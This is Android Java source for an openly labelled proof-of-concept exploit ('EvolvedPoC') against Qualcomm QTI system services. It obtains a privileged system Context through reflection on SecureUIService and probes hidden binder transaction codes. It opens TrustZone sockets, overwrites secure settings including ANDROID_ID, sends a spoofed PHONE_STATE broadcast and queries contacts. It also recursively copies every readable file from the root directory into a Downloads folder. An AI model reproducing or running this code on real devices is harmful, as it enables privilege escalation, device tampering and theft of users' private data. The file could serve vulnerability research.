package com.example.tzpoc;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "EvolvedPoC";
    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
    private static final String TEST_DATA = "POC_WRITE_TEST_DATA_12345";
    private static final String TEST_FILENAME = "poc_write_test.tmp";
    private static final long MAX_FILE_SIZE_FOR_DUMP = 10 * 1024 * 1024; // 10MB 以上のファイルはスキップ
    private static final int MAX_DEPTH = 6; // 再帰深さ制限（/ から 6 階層まで）

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    // サービスバインド用
    private IServiceManager mServiceManager;
    private IBinder mTZServiceBinder;
    private boolean isBoundCS = false;
    private boolean isBoundTZ = false;
    private ServiceConnection csConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("CS Service bound");
            if (mTZServiceBinder != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mServiceManager = null;
            isBoundCS = false;
            enableButtons(true, false);
            updateStatus("CS disconnected");
        }
    };
    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZServiceBinder = service;
            appendLog("TZ Service bound");
            if (mServiceManager != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZServiceBinder = null;
            isBoundTZ = false;
            enableButtons(true, false);
            updateStatus("TZ disconnected");
        }
    };

    // SecureUI から取得したシステムコンテキスト
    private Context systemContext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                acquireSystemContext();
                bindServices();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void acquireSystemContext() {
        try {
            Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
            Field contextField = clazz.getDeclaredField("context");
            contextField.setAccessible(true);
            systemContext = (Context) contextField.get(null);
            if (systemContext != null) {
                appendLog("SystemContext acquired via reflection");
            } else {
                appendLog("SystemContext is null");
            }
        } catch (Exception e) {
            appendLog("Failed to acquire SystemContext: " + e.getMessage());
            systemContext = null;
        }
    }

    private void bindServices() {
        try {
            Intent intentCS = new Intent();
            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
            isBoundCS = bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundCS) appendLog("CS bind failed");

            Intent intentTZ = new Intent();
            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            isBoundTZ = bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundTZ) appendLog("TZ bind failed");

            if (!isBoundCS && !isBoundTZ) {
                appendLog("Service bind failed, but continuing with SecureUI tests");
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
        }
        if (!isBoundCS && !isBoundTZ) {
            startTests();
        }
    }

    private void startTests() {
        if (testThread != null && testThread.isAlive()) return;
        testThread = new Thread(() -> executeFullTest());
        testThread.start();
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        // Phase 1: CS Service Enumeration
        appendLog("========== PHASE 1: CS Service Enumeration ==========");
        if (mServiceManager != null) {
            IBinder rticBinder = getService("rtic");
            if (rticBinder != null) {
                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
                testRticFlags(rtic);
                discoverMethods(rticBinder, "IRticService");
            }
            IBinder tlocBinder = getService("tloc");
            if (tlocBinder != null) {
                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
                testTloc(tloc);
                discoverMethods(tlocBinder, "ITlocService");
                testTlocHiddenMethod(tlocBinder);
            }
        }

        // Phase 2: TZAccess Socket Connect
        appendLog("========== PHASE 2: TZAccess Socket Connect ==========");
        if (mTZServiceBinder != null) {
            tryConnectViaTZReflect("/dev/socket/minksocket");
            tryConnectViaTZReflect("/dev/socket/ssgqmig");
        }

        // Phase 3: Deep File System Exploration (original)
        appendLog("========== PHASE 3: Deep File System Exploration ==========");
        exploreDeepFiles();

        // Phase 4: Settings Manipulation
        appendLog("========== PHASE 4: Settings Manipulation ==========");
        testSettingsWrite();

        // Phase 5: SecureUI SystemContext Advanced Tests
        appendLog("========== PHASE 5: SecureUI SystemContext Advanced Tests ==========");
        if (systemContext != null) {
            testSystemContextBroadcast();
            testSystemContextStartActivity();
            testSystemContextContentProvider();
            testSystemContextWriteSecureSettings();
            testSystemContextFileWrite();
        } else {
            appendLog("SystemContext not available, skipping SecureUI advanced tests");
        }

        // Phase 6: Write Verification (direct FileOutputStream)
        appendLog("========== PHASE 6: Write Verification (direct) ==========");
        performWriteVerification();

        // ***** NEW PHASE 7: Recursive file read & copy (dump) using SystemContext *****
        appendLog("========== PHASE 7: Recursive File Dump (read + copy) ==========");
        if (systemContext != null) {
            recursiveDumpFiles();
        } else {
            appendLog("SystemContext not available, skipping recursive dump");
        }

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    // ---------- 既存のテストメソッド（省略せずに再掲） ----------
    private IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("Got " + serviceName + " binder, status=" + status[0]);
                return binder;
            } else {
                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void testRticFlags(IRticService rtic) {
        appendLog("--- Testing RTIC with flags ---");
        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
        for (long flag : flags) {
            try {
                int[] status = new int[1];
                int[] ret = new int[1];
                byte[] data = rtic.getRticData(flag, status, ret, false);
                appendLog("Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            } catch (RemoteException e) {
                appendLog("RemoteException for flag " + flag + ": " + e.getMessage());
            }
        }
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = rtic.getRticData(0, status, ret, true);
            appendLog("z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTloc(ITlocService tloc) {
        appendLog("--- Testing ITlocService ---");
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            int warmup = tloc.tlocWarmUp();
            appendLog("tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTlocHiddenMethod(IBinder binder) {
        appendLog("--- Testing hidden method (code 2) of ITlocService ---");
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(binder.getInterfaceDescriptor());
            data.writeInt(123);
            data.writeString("test");
            boolean success = binder.transact(2, data, reply, 0);
            if (success) {
                appendLog("Hidden method call succeeded, reply size=" + reply.dataSize());
                reply.setDataPosition(0);
                try {
                    int result = reply.readInt();
                    appendLog("  readInt: " + result);
                } catch (Exception e) {}
                try {
                    String s = reply.readString();
                    appendLog("  readString: " + s);
                } catch (Exception e) {}
            } else {
                appendLog("Hidden method call failed");
            }
        } catch (Exception e) {
            appendLog("Hidden method error: " + e.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void discoverMethods(IBinder binder, String name) {
        appendLog("--- Discovering hidden methods for " + name + " ---");
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("  readInt: " + result);
                    } catch (Exception e) {}
                } else {
                    appendLog("Method " + code + " failed");
                }
            } catch (Exception e) {
                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void tryConnectViaTZReflect(String path) {
        appendLog("Trying TZAccess connect to " + path + " via reflection");
        if (mTZServiceBinder == null) {
            appendLog("  TZ binder null");
            return;
        }
        try {
            Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.a.IMinkSocketFd");
            Method asInterface = cls.getMethod("asInterface", IBinder.class);
            Object proxy = asInterface.invoke(null, mTZServiceBinder);
            Method aMethod = cls.getMethod("a", String.class, int[].class);
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
            if (pfd != null) {
                appendLog("  Got FD: " + iArr[0] + " for " + path);
                pfd.close();
            } else {
                appendLog("  Failed to get FD for " + path);
            }
        } catch (ClassNotFoundException e) {
            appendLog("  IMinkSocketFd class not found.");
        } catch (Exception e) {
            appendLog("  TZ connect error: " + e.getMessage());
        }
    }

    private void exploreDeepFiles() {
        appendLog("--- Deep File System Exploration ---");
        String[] paths = {
                "/proc/self/fd", "/proc/self/maps", "/proc/self/smaps",
                "/proc/self/comm", "/proc/self/limits", "/proc/self/statm",
                "/system/build.prop", "/system/etc/hosts", "/vendor/build.prop",
                "/proc/version"
        };
        for (String p : paths) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }
        // /data/local/tmp のリスト
        File tmp = new File("/data/local/tmp");
        if (tmp.exists() && tmp.canRead()) {
            appendLog("Contents of /data/local/tmp:");
            for (File f : tmp.listFiles()) {
                if (f != null) appendLog("  " + f.getName());
            }
        }
    }

    private void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists()) { appendLog(path + " does not exist"); return; }
        if (!f.canRead()) { appendLog(path + " not readable"); return; }
        if (f.isDirectory()) {
            appendLog(path + " is a directory");
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[4096];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("Content of " + path + ": " + content);
            } else {
                appendLog("Empty file: " + path);
            }
        } catch (Exception e) {
            appendLog("Error reading " + path + ": " + e.getMessage());
        }
    }

    private void testSettingsWrite() {
        appendLog("--- Normal Settings Write (without system context) ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("Current hidden_api_blacklist_exemptions: " + current);
            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("WRITE_SECURE_SETTINGS succeeded!");
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("Settings error: " + e.getMessage());
        }
    }

    // ---------- SecureUI SystemContext テスト ----------
    private void testSystemContextBroadcast() {
        appendLog("--- Sending broadcast with SystemContext ---");
        try {
            Intent intent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
            intent.setPackage("com.qualcomm.qti.services.secureui");
            systemContext.sendBroadcast(intent);
            appendLog("Broadcast ACTION_CLOSE sent");
        } catch (Exception e) {
            appendLog("Broadcast failed: " + e.getMessage());
        }
        try {
            Intent phoneIntent = new Intent("android.intent.action.PHONE_STATE");
            phoneIntent.putExtra("state", "RINGING");
            systemContext.sendBroadcast(phoneIntent);
            appendLog("Fake PHONE_STATE broadcast sent");
        } catch (Exception e) {
            appendLog("PHONE_STATE failed: " + e.getMessage());
        }
    }

    private void testSystemContextStartActivity() {
        appendLog("--- Starting activity with SystemContext ---");
        try {
            Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            systemContext.startActivity(settingsIntent);
            appendLog("Settings activity started");
        } catch (Exception e) {
            appendLog("StartActivity failed: " + e.getMessage());
        }
    }

    private void testSystemContextContentProvider() {
        appendLog("--- Querying ContentProvider with SystemContext ---");
        ContentResolver cr = systemContext.getContentResolver();
        try (Cursor c = cr.query(Settings.Global.CONTENT_URI, null, null, null, null)) {
            appendLog("Settings.Global query: " + (c != null ? "count=" + c.getCount() : "null"));
        } catch (Exception e) {
            appendLog("Settings query error: " + e.getMessage());
        }
        try (Cursor c = cr.query(Uri.parse("content://contacts/people"), null, null, null, null)) {
            appendLog("Contacts query: " + (c != null ? "count=" + c.getCount() : "null"));
        } catch (Exception e) {
            appendLog("Contacts query error: " + e.getMessage());
        }
    }

    private void testSystemContextWriteSecureSettings() {
        appendLog("--- Writing Secure Settings with SystemContext ---");
        try {
            boolean result = Settings.Secure.putString(systemContext.getContentResolver(),
                    Settings.Secure.ANDROID_ID, "POC_TEST_ID");
            appendLog("Write Secure.ANDROID_ID result: " + result);
        } catch (Exception e) {
            appendLog("Write Secure error: " + e.getMessage());
        }
    }

    private void testSystemContextFileWrite() {
        appendLog("--- File write via ContentResolver ---");
        try {
            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File testFile = new File(download, "systemcontext_write_test.txt");
            Uri fileUri = Uri.fromFile(testFile);
            try (java.io.OutputStream os = systemContext.getContentResolver().openOutputStream(fileUri)) {
                if (os != null) {
                    os.write("Written via SystemContext".getBytes(StandardCharsets.UTF_8));
                    appendLog("Write succeeded: " + testFile.getAbsolutePath());
                } else {
                    appendLog("openOutputStream returned null");
                }
            }
        } catch (Exception e) {
            appendLog("File write error: " + e.getMessage());
        }
    }

    // ---------- 書き込み検証（直接 FileOutputStream） ----------
    private void performWriteVerification() {
        appendLog("--- Write Verification (direct FileOutputStream) ---");
        String[] dirs = {
                "/data/local/tmp", "/data/misc", "/data/system", "/data/data",
                "/cache", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
                "/dev", "/proc", "/sys", "/system", "/"
        };
        for (String d : dirs) {
            if (stopRequested.get()) break;
            File dir = new File(d);
            if (!dir.exists()) continue;
            File testFile = new File(dir, TEST_FILENAME);
            boolean writeOk = writeFile(testFile, TEST_DATA);
            boolean verifyOk = false, deleteOk = false;
            if (writeOk) {
                verifyOk = verifyFile(testFile, TEST_DATA);
                if (verifyOk) deleteOk = testFile.delete();
            }
            appendLog(String.format(Locale.US,
                    "Dir: %s | canWrite=%b | write=%b | verify=%b | delete=%b",
                    d, dir.canWrite(), writeOk, verifyOk, deleteOk));
        }
    }

    private boolean writeFile(File file, String data) {
        try {
            File parent = file.getParentFile();
            if (parent != null && !parent.exists()) parent.mkdirs();
            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(data.getBytes(StandardCharsets.UTF_8));
                fos.flush();
                return true;
            }
        } catch (Exception e) {
            return false;
        }
    }

    private boolean verifyFile(File file, String expected) {
        if (!file.exists()) return false;
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[expected.length() + 10];
            int len = fis.read(buffer);
            if (len <= 0) return false;
            String actual = new String(buffer, 0, len, StandardCharsets.UTF_8);
            return expected.equals(actual);
        } catch (Exception e) {
            return false;
        }
    }

    // ---------- 新機能：再帰的全ファイルダンプ（読み取り＋コピー） ----------
    private void recursiveDumpFiles() {
        appendLog("--- Starting recursive file dump from root (/) ---");
        File root = new File("/");
        File outputBase = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (!outputBase.exists() && !outputBase.mkdirs()) {
            appendLog("Cannot create Download directory");
            return;
        }
        // ダンプ先ディレクトリ（タイムスタンプ付き）
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
        File dumpDir = new File(outputBase, "dump_" + timestamp);
        if (!dumpDir.exists() && !dumpDir.mkdirs()) {
            appendLog("Cannot create dump directory");
            return;
        }
        appendLog("Dumping to: " + dumpDir.getAbsolutePath());
        long startTime = System.currentTimeMillis();
        AtomicBoolean errorOccurred = new AtomicBoolean(false);
        // 再帰走査（深さ制限付き）
        walkAndDump(root, dumpDir, 0, errorOccurred);
        long elapsed = System.currentTimeMillis() - startTime;
        appendLog("Dump finished. Elapsed: " + elapsed + " ms. Errors: " + (errorOccurred.get() ? "YES" : "NO"));
    }

    private void walkAndDump(File dir, File outputDir, int depth, AtomicBoolean errorOccurred) {
        if (stopRequested.get()) return;
        if (depth > MAX_DEPTH) {
            appendLog("Max depth reached at " + dir.getAbsolutePath() + ", skipping");
            return;
        }
        if (!dir.exists()) return;
        if (!dir.canRead()) {
            appendLog("Cannot read directory: " + dir.getAbsolutePath());
            return;
        }
        File[] children = dir.listFiles();
        if (children == null) return;
        for (File child : children) {
            if (stopRequested.get()) break;
            try {
                if (child.isDirectory()) {
                    // 再帰
                    walkAndDump(child, outputDir, depth + 1, errorOccurred);
                } else {
                    // ファイル → 読み取り可能かつサイズ制限内ならコピー
                    if (child.canRead() && child.length() <= MAX_FILE_SIZE_FOR_DUMP) {
                        copyFileToDump(child, outputDir);
                    } else {
                        // 読み取り不可 or 大きすぎる
                        if (!child.canRead()) {
                            appendLog("Not readable: " + child.getAbsolutePath());
                        } else {
                            appendLog("File too large (>10MB): " + child.getAbsolutePath());
                        }
                    }
                }
            } catch (Exception e) {
                appendLog("Error processing " + child.getAbsolutePath() + ": " + e.getMessage());
                errorOccurred.set(true);
            }
        }
    }

    private void copyFileToDump(File src, File outputDir) {
        // 安全なファイル名を生成（絶対パスをアンダースコアで置換）
        String relPath = src.getAbsolutePath().replace("/", "_");
        // 長すぎる場合は短縮
        if (relPath.length() > 200) {
            relPath = relPath.substring(0, 200);
        }
        File dest = new File(outputDir, relPath + ".dump");
        // 既に存在する場合はスキップ（重複防止）
        if (dest.exists()) return;
        try (FileInputStream fis = new FileInputStream(src);
             FileOutputStream fos = new FileOutputStream(dest)) {
            byte[] buffer = new byte[8192];
            int len;
            while ((len = fis.read(buffer)) > 0) {
                fos.write(buffer, 0, len);
            }
            appendLog("Copied: " + src.getAbsolutePath() + " -> " + dest.getName());
        } catch (Exception e) {
            appendLog("Copy failed for " + src.getAbsolutePath() + ": " + e.getMessage());
        }
    }

    // ---------- ログ関連 ----------
    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "final_evolved_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Final Evolved PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBoundCS) unbindService(csConnection);
        if (isBoundTZ) unbindService(tzConnection);
        saveLog();
    }
}
